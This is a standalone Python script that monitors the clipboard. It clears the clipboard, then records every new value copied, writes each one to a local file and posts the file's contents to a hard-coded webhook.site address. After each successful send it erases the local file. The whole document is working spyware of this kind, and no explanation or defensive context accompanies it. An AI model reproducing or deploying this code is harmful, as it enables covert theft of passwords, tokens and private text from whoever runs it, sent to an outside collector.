import clipboard
import time
import requests

saved_clips = []
filename = 'Clips.txt'
interval = 1
save_interval = 5
delete_interval = 5
webhook_url = 'https://webhook.site/471bf52a-5a61-4ec1-9f01-3cb4db8ac03e'

def erase_file():
    with open(filename, 'w') as file:
        file.write('')
def receive_from_clipboard():
    return clipboard.paste()


def save_clipboard_periodically():
    last_clipboard_data = ""
    count = 0

    while True:
        clipboard_data = receive_from_clipboard()

        if clipboard_data != last_clipboard_data and clipboard_data != "":
            saved_clips.append(clipboard_data)
            last_clipboard_data = clipboard_data

            with open(filename, 'a') as file:
                file.write(str(count) + ": " + str(clipboard_data) + "\n")

            count += 1
            print(f"{count}: {clipboard_data}")

            send_to_webhook()

        time.sleep(interval)


def send_to_webhook():
    with open(filename, 'r') as file:
        file_content = file.read()

    payload = {
        'content': file_content
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, json=payload, headers=headers)

    if response.status_code == 200:
        print('Webhook sent successfully!')

        print("Erasing File")
        erase_file()
        print("file has been erased")

    else:
        print(f'Failed to send webhook. Status code: {response.status_code}')
        print(response.text)



clipboard.copy('')
save_clipboard_periodically()





